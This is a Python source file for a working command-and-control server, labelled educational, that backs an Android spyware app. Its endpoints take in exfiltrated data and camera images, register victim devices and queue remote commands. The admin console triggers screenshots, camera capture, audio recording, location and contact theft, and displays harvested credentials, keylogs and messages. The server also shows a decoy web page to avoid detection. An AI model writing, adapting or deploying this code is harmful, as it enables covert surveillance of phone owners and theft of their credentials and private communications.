#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
C2 Server for Android Malware Education

This is a simple Command & Control server designed to receive and display data
collected from the educational Android app that demonstrates malicious functionality.

EDUCATIONAL PURPOSE ONLY - DO NOT USE FOR MALICIOUS PURPOSES
"""

import argparse
import base64
import datetime
import json
import logging
import os
import socket
import ssl
import threading
import time
import zlib
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("c2_server.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("C2Server")

# Constants
DEFAULT_PORT = 42069
DATA_DIR = "harvested_data"


class C2RequestHandler(BaseHTTPRequestHandler):
    """
    HTTP Request handler for C2 server
    """
    
    def log_message(self, format, *args):
        """Override to use our custom logger instead of standard output"""
        logger.info("%s - %s", self.address_string(), format % args)
    
    def do_GET(self):
        """
        Handle GET requests - Process data requests or return fake website
        """
        # Parse URL path
        parsed_path = urlparse(self.path)
        path = parsed_path.path
        
        # Check if this is a data request from admin console
        if path.startswith('/data/'):
            # Extract the data type from the URL path
            data_type = path.split('/')[2]
            self._serve_data_listing(data_type)
            return
            
        # Default response - fake website
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        # Send a fake website so if someone discovers the server, it doesn't look suspicious
        fake_site = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>System Administration</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
                h1 { color: #444; }
                .container { max-width: 800px; margin: 0 auto; }
                .info { background: #f5f5f5; padding: 20px; border-radius: 5px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>System Management Portal</h1>
                <div class="info">
                    <p>This is a system management portal. Access is restricted to authorized personnel.</p>
                    <p>Please contact your administrator for access credentials.</p>
                </div>
            </div>
        </body>
        </html>
        """
        self.wfile.write(fake_site.encode())
        
    def _serve_data_listing(self, data_type):
        """Serve data listing for admin console"""
        data_dir = os.path.join(DATA_DIR, data_type)
        
        if not os.path.exists(data_dir):
            # Return empty list instead of 404 if directory doesn't exist yet
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps([]).encode())
            return
        
        # Get file listing
        files = []
        
        try:
            for filename in os.listdir(data_dir):
                if filename.endswith(".json") or filename.endswith(".txt") or filename.endswith(".bin"):
                    file_path = os.path.join(data_dir, filename)
                    try:
                        if filename.endswith('.json'):
                            with open(file_path, 'r') as f:
                                data = json.load(f)
                                files.append({
                                    "filename": filename,
                                    "size": os.path.getsize(file_path),
                                    "timestamp": datetime.datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat(),
                                    "data": data
                                })
                        else:
                            # For non-JSON files, read as text if possible
                            try:
                                with open(file_path, 'r') as f:
                                    content = f.read()
                                    files.append({
                                        "filename": filename,
                                        "size": os.path.getsize(file_path),
                                        "timestamp": datetime.datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat(),
                                        "data": {"content": content}
                                    })
                            except UnicodeDecodeError:
                                # Binary file
                                files.append({
                                    "filename": filename,
                                    "size": os.path.getsize(file_path),
                                    "timestamp": datetime.datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat(),
                                    "data": {"content": f"<Binary file: {os.path.getsize(file_path)} bytes>"}
                                })
                    except Exception as e:
                        files.append({
                            "filename": filename,
                            "size": os.path.getsize(file_path),
                            "timestamp": datetime.datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat(),
                            "error": str(e)
                        })
        except Exception as e:
            logger.error(f"Error listing files in {data_dir}: {str(e)}")
        
        self.send_response(200)
        self.send_header("Content-type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(files).encode())
    
    def do_POST(self):
        """
        Handle POST requests containing exfiltrated data from the Android app
        """
        try:
            # Parse URL path
            parsed_path = urlparse(self.path)
            path = parsed_path.path
            
            # Handle different endpoint types
            if path == "/exfil":
                self._handle_exfil_data()
            elif path == "/register":
                self._handle_device_registration()
            elif path == "/command":
                self._handle_command_request()
            else:
                # Respond with 404 for unrecognized paths to avoid exposing the server
                self.send_response(404)
                self.end_headers()
                
        except Exception as e:
            logger.error(f"Error handling POST request: {str(e)}")
            self.send_response(500)
            self.end_headers()
    
    def _handle_exfil_data(self):
        """Handle incoming exfiltrated data"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            # Try to decompress if data is compressed
            try:
                decompressed_data = zlib.decompress(post_data)
                data = decompressed_data
            except:
                data = post_data
            
            # Try to decode JSON
            try:
                json_data = json.loads(data.decode('utf-8'))
                # Log successful receipt of data
                logger.info(f"Received data type: {json_data.get('type', 'unknown')}")
                
                # Save the data
                self._save_received_data(json_data)
                
                # Respond with success
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success", "message": "Data received"}).encode())
                
            except json.JSONDecodeError:
                # If not JSON, try to handle as binary data (like camera images)
                if self.headers.get('X-Data-Type') == 'camera_image':
                    # Handle camera image data
                    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                    image_path = os.path.join(DATA_DIR, "camera", f"capture_{timestamp}.jpg")
                    os.makedirs(os.path.dirname(image_path), exist_ok=True)
                    
                    with open(image_path, 'wb') as f:
                        f.write(data)
                    
                    logger.info(f"Saved camera image: {image_path}")
                    
                    # Respond with success
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"status": "success", "message": "Image received"}).encode())
                else:
                    # Handle unknown binary data
                    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                    data_type = self.headers.get('X-Data-Type', 'unknown')
                    data_path = os.path.join(DATA_DIR, "binary", f"{data_type}_{timestamp}.bin")
                    os.makedirs(os.path.dirname(data_path), exist_ok=True)
                    
                    with open(data_path, 'wb') as f:
                        f.write(data)
                    
                    logger.info(f"Saved binary data: {data_path}")
                    
                    # Respond with success
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"status": "success", "message": "Binary data received"}).encode())
                    
        except Exception as e:
            logger.error(f"Error processing exfiltrated data: {str(e)}")
            self.send_response(400)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())
    
    def _handle_device_registration(self):
        """Handle device registration requests"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            device_id = data.get('device_id')
            device_info = data.get('device_info', {})
            
            logger.info(f"Device registration: {device_id}")
            
            # Create devices directory
            devices_dir = os.path.join(DATA_DIR, "devices")
            os.makedirs(devices_dir, exist_ok=True)
            
            # Create commands directory
            commands_dir = os.path.join(DATA_DIR, "commands")
            os.makedirs(commands_dir, exist_ok=True)
            
            device_file = os.path.join(devices_dir, f"{device_id}.json")
            
            with open(device_file, 'w') as f:
                json.dump({
                    "device_id": device_id,
                    "device_info": device_info,
                    "registration_time": datetime.datetime.now().isoformat(),
                    "last_seen": datetime.datetime.now().isoformat()
                }, f, indent=2)
            
            # Initialize command file if it doesn't exist
            command_file = os.path.join(commands_dir, f"{device_id}.json")
            if not os.path.exists(command_file):
                with open(command_file, 'w') as f:
                    json.dump({"pending": [], "executed": []}, f, indent=2)
            
            # Respond with success and initial commands
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            
            # Send initial commands to the device
            self.wfile.write(json.dumps({
                "status": "success",
                "device_id": device_id,
                "commands": [
                    {"command": "set_interval", "interval": 15},  # Set upload interval to 15 minutes
                    {"command": "collect_info"}  # Request basic device info
                ]
            }).encode())
            
        except Exception as e:
            logger.error(f"Error processing device registration: {str(e)}")
            self.send_response(400)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())
    
    def _handle_command_request(self):
        """Handle command requests from devices"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            device_id = data.get('device_id')
            
            # Update last seen time
            self._update_device_last_seen(device_id)
            
            logger.info(f"Command request from device: {device_id}")
            
            # Check if there are pending commands for this device
            commands = self._get_pending_commands(device_id)
            
            # Respond with commands
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "success",
                "commands": commands
            }).encode())
            
        except Exception as e:
            logger.error(f"Error processing command request: {str(e)}")
            self.send_response(400)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())
    
    def _save_received_data(self, json_data):
        """Save received JSON data to appropriate files"""
        data_type = json_data.get('type', 'unknown')
        device_id = json_data.get('device_id', 'unknown_device')
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Create directory for this data type
        data_dir = os.path.join(DATA_DIR, data_type)
        os.makedirs(data_dir, exist_ok=True)
        
        # Save to file
        file_path = os.path.join(data_dir, f"{device_id}_{timestamp}.json")
        with open(file_path, 'w') as f:
            json.dump(json_data, f, indent=2)
        
        logger.info(f"Saved {data_type} data to {file_path}")
        
        # Update device last seen time
        self._update_device_last_seen(device_id)
    
    def _update_device_last_seen(self, device_id):
        """Update the last seen timestamp for a device"""
        if not device_id or device_id == "unknown_device":
            return
        
        # Create devices directory if it doesn't exist
        devices_dir = os.path.join(DATA_DIR, "devices")
        os.makedirs(devices_dir, exist_ok=True)
            
        device_file = os.path.join(devices_dir, f"{device_id}.json")
        
        if os.path.exists(device_file):
            try:
                with open(device_file, 'r') as f:
                    device_data = json.load(f)
                
                device_data["last_seen"] = datetime.datetime.now().isoformat()
                
                with open(device_file, 'w') as f:
                    json.dump(device_data, f, indent=2)
            except Exception as e:
                logger.error(f"Error updating device last seen: {str(e)}")
        else:
            # Create a new device entry
            try:
                device_data = {
                    "device_id": device_id,
                    "device_info": {},
                    "registration_time": datetime.datetime.now().isoformat(),
                    "last_seen": datetime.datetime.now().isoformat()
                }
                
                with open(device_file, 'w') as f:
                    json.dump(device_data, f, indent=2)
                
                logger.info(f"Created new device entry for {device_id}")
            except Exception as e:
                logger.error(f"Error creating device entry: {str(e)}")
    
    def _get_pending_commands(self, device_id):
        """Get pending commands for a device"""
        commands_dir = os.path.join(DATA_DIR, "commands")
        os.makedirs(commands_dir, exist_ok=True)
        
        device_commands_file = os.path.join(commands_dir, f"{device_id}.json")
        
        if not os.path.exists(device_commands_file):
            # Create an empty commands file for this device
            with open(device_commands_file, 'w') as f:
                json.dump({"pending": [], "executed": []}, f, indent=2)
            return []
            
        try:
            with open(device_commands_file, 'r') as f:
                commands_data = json.load(f)
            
            # Get pending commands
            pending_commands = commands_data.get("pending", [])
            
            # Move pending commands to executed
            commands_data["pending"] = []
            if "executed" not in commands_data:
                commands_data["executed"] = []
            
            for cmd in pending_commands:
                cmd["executed_at"] = datetime.datetime.now().isoformat()
                commands_data["executed"].append(cmd)
            
            # Save updated commands file
            with open(device_commands_file, 'w') as f:
                json.dump(commands_data, f, indent=2)
            
            return pending_commands
            
        except Exception as e:
            logger.error(f"Error getting pending commands: {str(e)}")
            return []


class CommandManager:
    """
    Manage commands for connected devices
    """
    
    def __init__(self):
        self.commands_dir = os.path.join(DATA_DIR, "commands")
        os.makedirs(self.commands_dir, exist_ok=True)
    
    def add_command(self, device_id, command_data):
        """Add a command for a device"""
        # Ensure commands directory exists
        os.makedirs(self.commands_dir, exist_ok=True)
        
        device_commands_file = os.path.join(self.commands_dir, f"{device_id}.json")
        
        commands_data = {"pending": [], "executed": []}
        if os.path.exists(device_commands_file):
            try:
                with open(device_commands_file, 'r') as f:
                    commands_data = json.load(f)
            except:
                pass
        
        # Add timestamp to command
        command_data["created_at"] = datetime.datetime.now().isoformat()
        
        # Add command to pending list
        if "pending" not in commands_data:
            commands_data["pending"] = []
        commands_data["pending"].append(command_data)
        
        # Save updated commands
        with open(device_commands_file, 'w') as f:
            json.dump(commands_data, f, indent=2)
        
        logger.info(f"Added command to device {device_id}: {command_data}")
        return True
    
    def get_devices(self):
        """Get list of registered devices"""
        devices_dir = os.path.join(DATA_DIR, "devices")
        if not os.path.exists(devices_dir):
            return []
        
        devices = []
        for filename in os.listdir(devices_dir):
            if filename.endswith(".json"):
                try:
                    with open(os.path.join(devices_dir, filename), 'r') as f:
                        device_data = json.load(f)
                        devices.append(device_data)
                except:
                    pass
        
        return devices


class WebAdminConsole:
    """
    Web-based admin console for interacting with the C2 server
    """
    
    def __init__(self, port=8080):
        self.port = port
        self.command_manager = CommandManager()
        self.server = None
        self.server_thread = None
    
    def start(self):
        """Start the web admin console"""
        class AdminRequestHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                logger.info("%s - %s", self.address_string(), format % args)
            
            def do_GET(self):
                if self.path == "/":
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(self._get_dashboard_html().encode())
                elif self.path == "/devices":
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps(self.server.command_manager.get_devices()).encode())
                elif self.path.startswith("/data/"):
                    data_type = self.path.split("/")[2]
                    self._serve_data_listing(data_type)
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_POST(self):
                if self.path == "/command":
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length)
                    data = json.loads(post_data.decode('utf-8'))
                    
                    device_id = data.get('device_id')
                    command = data.get('command')
                    
                    if not device_id or not command:
                        self.send_response(400)
                        self.send_header("Content-type", "application/json")
                        self.end_headers()
                        self.wfile.write(json.dumps({"status": "error", "message": "Missing device_id or command"}).encode())
                        return
                    
                    # Create commands directory if it doesn't exist
                    commands_dir = os.path.join(DATA_DIR, "commands")
                    os.makedirs(commands_dir, exist_ok=True)
                    
                    success = self.server.command_manager.add_command(device_id, command)
                    
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"status": "success" if success else "error"}).encode())
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def _serve_data_listing(self, data_type):
                data_dir = os.path.join(DATA_DIR, data_type)
                
                if not os.path.exists(data_dir):
                    self.send_response(404)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"status": "error", "message": f"No data of type '{data_type}'"}).encode())
                    return
                
                # Get file listing
                files = []
                for filename in os.listdir(data_dir):
                    if filename.endswith(".json"):
                        file_path = os.path.join(data_dir, filename)
                        try:
                            with open(file_path, 'r') as f:
                                data = json.load(f)
                                files.append({
                                    "filename": filename,
                                    "size": os.path.getsize(file_path),
                                    "timestamp": datetime.datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat(),
                                    "data": data
                                })
                        except:
                            files.append({
                                "filename": filename,
                                "size": os.path.getsize(file_path),
                                "timestamp": datetime.datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat(),
                                "error": "Could not parse JSON"
                            })
                
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(files).encode())
            
            def _get_dashboard_html(self):
                return """
                <!DOCTYPE html>
                <html>
                <head>
                    <title>C2 Server Admin Console</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1">
                    <style>
                        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
                        h1, h2 { color: #444; }
                        .container { max-width: 1200px; margin: 0 auto; }
                        .panel { background: #f5f5f5; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
                        .device-card { background: white; border: 1px solid #ddd; padding: 15px; margin-bottom: 10px; border-radius: 5px; }
                        .device-controls { margin-top: 10px; }
                        button { background: #4CAF50; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; }
                        button:hover { background: #45a049; }
                        .data-types { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 20px; }
                        .data-type { background: #2196F3; color: white; padding: 8px 16px; border-radius: 4px; cursor: pointer; }
                        #data-viewer { background: white; border: 1px solid #ddd; padding: 15px; border-radius: 5px; margin-top: 20px; max-height: 500px; overflow: auto; }
                        pre { margin: 0; white-space: pre-wrap; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h1>C2 Server Admin Console</h1>
                        
                        <div class="panel">
                            <h2>Connected Devices</h2>
                            <div id="devices-list">Loading devices...</div>
                        </div>
                        
                        <div class="panel">
                            <h2>Harvested Data</h2>
                            <div class="data-types">
                                <div class="data-type" onclick="loadData('credentials')">Credentials</div>
                                <div class="data-type" onclick="loadData('keylog')">Keylog Data</div>
                                <div class="data-type" onclick="loadData('location')">Location Data</div>
                                <div class="data-type" onclick="loadData('contacts')">Contacts</div>
                                <div class="data-type" onclick="loadData('messages')">Messages</div>
                                <div class="data-type" onclick="loadData('screenshots')">Screenshots</div>
                            </div>
                            <div id="data-viewer">Select a data type to view</div>
                        </div>
                    </div>
                    
                    <script>
                        // Load devices
                        function loadDevices() {
                            fetch('/devices')
                                .then(response => response.json())
                                .then(data => {
                                    const devicesDiv = document.getElementById('devices-list');
                                    if (data.length === 0) {
                                        devicesDiv.innerHTML = '<p>No devices registered yet.</p>';
                                        return;
                                    }
                                    
                                    let html = '';
                                    data.forEach(device => {
                                        html += `
                                            <div class="device-card">
                                                <h3>Device ID: ${device.device_id}</h3>
                                                <p>Registration Time: ${device.registration_time}</p>
                                                <p>Last Seen: ${device.last_seen}</p>
                                                <div class="device-info">
                                                    <p>Device Model: ${device.device_info.model || 'Unknown'}</p>
                                                    <p>Android Version: ${device.device_info.android_version || 'Unknown'}</p>
                                                </div>
                                                <div class="device-controls">
                                                    <button onclick="sendCommand('${device.device_id}', 'collect_info')">Collect Device Info</button>
                                                    <button onclick="sendCommand('${device.device_id}', 'capture_screenshot')">Capture Screenshot</button>
                                                    <button onclick="sendCommand('${device.device_id}', 'capture_camera')">Capture Camera</button>
                                                    <button onclick="sendCommand('${device.device_id}', 'record_audio')">Record Audio</button>
                                                    <button onclick="sendCommand('${device.device_id}', 'get_location')">Get Location</button>
                                                    <button onclick="sendCommand('${device.device_id}', 'get_contacts')">Get Contacts</button>

                                                </div>
                                            </div>
                                        `;
                                    });
                                    
                                    devicesDiv.innerHTML = html;
                                })
                                .catch(error => {
                                    console.error('Error loading devices:', error);
                                    document.getElementById('devices-list').innerHTML = '<p>Error loading devices.</p>';
                                });
                        }
                        
                        // Send command to device
                        function sendCommand(deviceId, commandType) {
                            const commandData = { command: commandType };
                            
                            fetch('/command', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    device_id: deviceId,
                                    command: commandData
                                })
                            })
                                .then(response => response.json())
                                .then(data => {
                                    if (data.status === 'success') {
                                        alert(`Command "${commandType}" sent to device ${deviceId}`);
                                    } else {
                                        alert(`Error sending command: ${data.message || 'Unknown error'}`);
                                    }
                                })
                                .catch(error => {
                                    console.error('Error sending command:', error);
                                    alert('Error sending command. See console for details.');
                                });
                        }
                        
                        // Load data of specific type
                        function loadData(dataType) {
                            fetch(`/data/${dataType}`)
                                .then(response => response.json())
                                .then(data => {
                                    const dataViewer = document.getElementById('data-viewer');
                                    if (data.length === 0) {
                                        dataViewer.innerHTML = `<p>No data of type "${dataType}" available.</p>`;
                                        return;
                                    }
                                    
                                    let html = `<h3>${dataType} Data (${data.length} files)</h3>`;
                                    
                                    data.forEach(item => {
                                        html += `
                                            <div style="border-bottom: 1px solid #ddd; padding-bottom: 10px; margin-bottom: 10px;">
                                                <p><strong>Filename:</strong> ${item.filename}</p>
                                                <p><strong>Timestamp:</strong> ${item.timestamp}</p>
                                                <p><strong>Size:</strong> ${item.size} bytes</p>
                                                <pre>${JSON.stringify(item.data, null, 2)}</pre>
                                            </div>
                                        `;
                                    });
                                    
                                    dataViewer.innerHTML = html;
                                })
                                .catch(error => {
                                    console.error(`Error loading ${dataType} data:`, error);
                                    document.getElementById('data-viewer').innerHTML = `<p>Error loading ${dataType} data.</p>`;
                                });
                        }
                        
                        // Initial load
                        document.addEventListener('DOMContentLoaded', function() {
                            loadDevices();
                            
                            // Refresh devices every 30 seconds
                            setInterval(loadDevices, 30000);
                        });
                    </script>
                </body>
                </html>
                """
        
        # Create server
        self.server = HTTPServer(('localhost', self.port), AdminRequestHandler)
        self.server.command_manager = self.command_manager
        
        # Start server in a separate thread
        self.server_thread = threading.Thread(target=self._run_server)
        self.server_thread.daemon = True
        self.server_thread.start()
        
        logger.info(f"Admin console running at http://localhost:{self.port}")
    
    def _run_server(self):
        self.server.serve_forever()
    
    def stop(self):
        """Stop the web admin console"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            logger.info("Admin console stopped")


def create_ssl_context(cert_file, key_file):
    """Create SSL context for HTTPS server"""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=cert_file, keyfile=key_file)
    return context


def generate_self_signed_cert(cert_file="server.crt", key_file="server.key"):
    """Generate a self-signed certificate if one doesn't exist"""
    if os.path.exists(cert_file) and os.path.exists(key_file):
        logger.info(f"Using existing certificate and key files: {cert_file}, {key_file}")
        return (cert_file, key_file)
    
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
        import datetime
        
        # Generate private key
        logger.info("Generating RSA private key...")
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        
        # Write private key to file
        with open(key_file, "wb") as f:
            f.write(private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))
        
        # Create self-signed certificate
        logger.info("Creating self-signed certificate...")
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Educational Organization"),
            x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow()
        ).not_valid_after(
            datetime.datetime.utcnow() + datetime.timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName("localhost")]),
            critical=False
        ).sign(private_key, hashes.SHA256())
        
        # Write certificate to file
        with open(cert_file, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        logger.info(f"Self-signed certificate generated: {cert_file}, {key_file}")
        return (cert_file, key_file)
    except ImportError:
        logger.error("Failed to generate certificate: cryptography module not available")
        logger.info("Please install it with: pip install cryptography")
        raise Exception("Failed to generate certificate: cryptography module not available")


def run_c2_server(port, use_ssl=True, cert_file="server.crt", key_file="server.key"):
    """Run the C2 server"""
    # Create all required directories
    os.makedirs(DATA_DIR, exist_ok=True)
    
    # Core directories
    os.makedirs(os.path.join(DATA_DIR, "devices"), exist_ok=True)
    os.makedirs(os.path.join(DATA_DIR, "commands"), exist_ok=True)
    
    # Data type directories
    data_types = [
        "credentials", "keylog", "location", "contacts", "messages", 
        "screenshots", "camera", "audio", "device_info", "binary", 
        "sensitive", "test", "uploads"  # Added "test" and "uploads" directories
    ]
    
    for data_type in data_types:
        type_dir = os.path.join(DATA_DIR, data_type)
        os.makedirs(type_dir, exist_ok=True)
        logger.info(f"Created directory: {type_dir}")
    
    logger.info(f"Created all data directories in {DATA_DIR}")
    
    # Create HTTPS server
    httpd = HTTPServer(('0.0.0.0', port), C2RequestHandler)
    
    if use_ssl:
        # Generate or use existing certificate
        cert_file, key_file = generate_self_signed_cert(cert_file, key_file)
        
        # Wrap socket with SSL
        httpd.socket = ssl.wrap_socket(
            httpd.socket,
            keyfile=key_file,
            certfile=cert_file,
            server_side=True
        )
        
        logger.info(f"C2 server running on https://0.0.0.0:{port}")
    else:
        logger.info(f"C2 server running on http://0.0.0.0:{port}")
    
    # Start admin console
    admin_console = WebAdminConsole()
    admin_console.start()
    
    try:
        # Run server
        httpd.serve_forever()
    except KeyboardInterrupt:
        logger.info("Server shutting down...")
    finally:
        httpd.server_close()
        admin_console.stop()


if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="C2 Server for Android Malware Education")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Port to listen on (default: {DEFAULT_PORT})")
    parser.add_argument("--no-ssl", action="store_true", help="Disable SSL (not recommended)")
    parser.add_argument("--cert", type=str, default="server.crt", help="SSL certificate file")
    parser.add_argument("--key", type=str, default="server.key", help="SSL key file")
    
    args = parser.parse_args()
    
    # Run server
    run_c2_server(args.port, not args.no_ssl, args.cert, args.key)